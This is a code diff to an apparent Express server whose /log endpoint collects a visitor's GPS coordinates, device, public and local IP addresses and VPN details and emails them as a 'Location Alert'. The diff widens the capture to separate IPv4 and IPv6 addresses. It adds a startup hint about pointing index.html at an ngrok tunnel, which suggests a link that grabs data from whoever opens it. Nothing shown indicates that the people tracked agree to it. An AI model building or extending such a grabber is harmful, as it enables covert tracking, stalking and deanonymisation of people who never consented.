@@ -36,8 +36,10 @@ app.post("/log", async (req, res) => {
     accuracy, 
     userAgent, 
     device, 
-    publicIpAddress, 
-    localIpAddress, 
+    publicIPv4, 
+    publicIPv6, 
+    localIPv4, 
+    localIPv6, 
     isVPN, 
     vpnProvider, 
     vpnLocation 
@@ -239,12 +241,20 @@ app.post("/log", async (req, res) => {
               <td>${accuracy ? Math.round(accuracy) + ' meters' : 'Not available'}</td>
             </tr>
             <tr>
-              <td>Public IP Address</td>
-              <td>${publicIpAddress || 'Not available'}</td>
+              <td>Public IPv4 Address</td>
+              <td>${publicIPv4 || 'Not available'}</td>
             </tr>
             <tr>
-              <td>Local IP Address</td>
-              <td>${localIpAddress || 'Not available'}</td>
+              <td>Public IPv6 Address</td>
+              <td>${publicIPv6 || 'Not available'}</td>
+            </tr>
+            <tr>
+              <td>Local IPv4 Address</td>
+              <td>${localIPv4 || 'Not available'}</td>
+            </tr>
+            <tr>
+              <td>Local IPv6 Address</td>
+              <td>${localIPv6 || 'Not available'}</td>
             </tr>
             <tr>
               <td>VPN Detected</td>
@@ -293,7 +303,7 @@ app.post("/log", async (req, res) => {
       to: EMAIL_TO,
       subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position Data Received`,
       html: htmlTemplate,
-      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\nPublic IP: ${publicIpAddress}\nLocal IP: ${localIpAddress}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}${isVPN ? `\nVPN Provider: ${vpnProvider}\nVPN Server Location: ${vpnLocation}` : ''}`
+      text: `Location Alert: ${mapLink}\nCoordinates: Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nTimestamp: ${formattedTime}\nDevice: ${device}\nPublic IPv4: ${publicIPv4}\nPublic IPv6: ${publicIPv6}\nLocal IPv4: ${localIPv4}\nLocal IPv6: ${localIPv6}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}${isVPN ? `\nVPN Provider: ${vpnProvider}\nVPN Server Location: ${vpnLocation}` : ''}`
     };
 
     // Send email
@@ -318,4 +328,5 @@ const port = process.env.PORT || 4000;
 app.listen(port, () => {
   console.log(`🚀 Server running on http://localhost:${port}`);
   console.log(`🔗 Use with Ngrok: ngrok http ${port}`);
+  console.log(`Replace 'https://your-ngrok-url.ngrok-free.app' in index.html with your actual ngrok URL`);
 });
